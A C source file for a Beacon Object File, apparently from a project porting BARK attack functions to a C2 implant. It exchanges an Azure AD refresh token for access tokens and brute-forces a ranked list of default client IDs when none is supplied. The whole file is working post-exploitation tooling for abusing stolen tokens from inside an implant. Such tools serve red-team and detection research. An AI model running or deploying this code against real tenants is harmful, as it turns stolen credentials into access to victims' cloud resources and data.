/*
 * get_access_token_with_rt.c — BARK BOF
 * Get-AccessTokenWithRefreshToken — Exchange a refresh token for an access token
 *
 * Args : resource, clientId, refreshToken, tenantId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[512];
    static char bodyBuf[8192];
    static char encRT[4096];
    LPWSTR widePath = NULL;
    char  *resource = NULL, *clientId = NULL, *refreshToken = NULL, *tenantId = NULL;

    BeaconDataParse(&parser, args, alen);
    resource     = BeaconDataExtract(&parser, NULL);
    clientId     = BeaconDataExtract(&parser, NULL);
    refreshToken = BeaconDataExtract(&parser, NULL);
    tenantId     = BeaconDataExtract(&parser, NULL);

    if (!tenantId || MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_get_tokens_with_rt "
            "<resource> [clientId] <refreshToken> <tenantId>\n");
        return;
    }

    UrlEncode(refreshToken, encRT, sizeof(encRT));

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    if (clientId && MSVCRT$strlen(clientId) > 0) {
        MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
            "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
            clientId, encRT, resource);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AccessTokenWithRefreshToken\n");
        BarkTokenPost(widePath, bodyBuf);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AccessTokenWithRefreshToken -- no clientId specified, trying %d capability-ranked clients...\n",
            BARK_DEFAULT_CLIENT_ID_COUNT);
        int found = 0;
        int i;
        for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
            int clientIndex = BarkClientIndexForResource(resource, i);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying %d/%d: %s (%s)...\n",
                i + 1, BARK_DEFAULT_CLIENT_ID_COUNT,
                BARK_DEFAULT_CLIENT_NAMES[clientIndex],
                BARK_DEFAULT_CLIENT_IDS[clientIndex]);
            MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
                "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
                BARK_DEFAULT_CLIENT_IDS[clientIndex], encRT, resource);
            if (BarkTokenPostTry(widePath, bodyBuf, 1)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] client_id: %s (%s)\n",
                    BARK_DEFAULT_CLIENT_IDS[clientIndex],
                    BARK_DEFAULT_CLIENT_NAMES[clientIndex]);
                found = 1;
                break;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "    [-] Failed.\n");
        }
        if (!found)
            BeaconPrintf(CALLBACK_ERROR,
                "[-] All %d capability-ranked client IDs failed. Specify a clientId explicitly.\n",
                BARK_DEFAULT_CLIENT_ID_COUNT);
    }

    HFree(widePath);
}
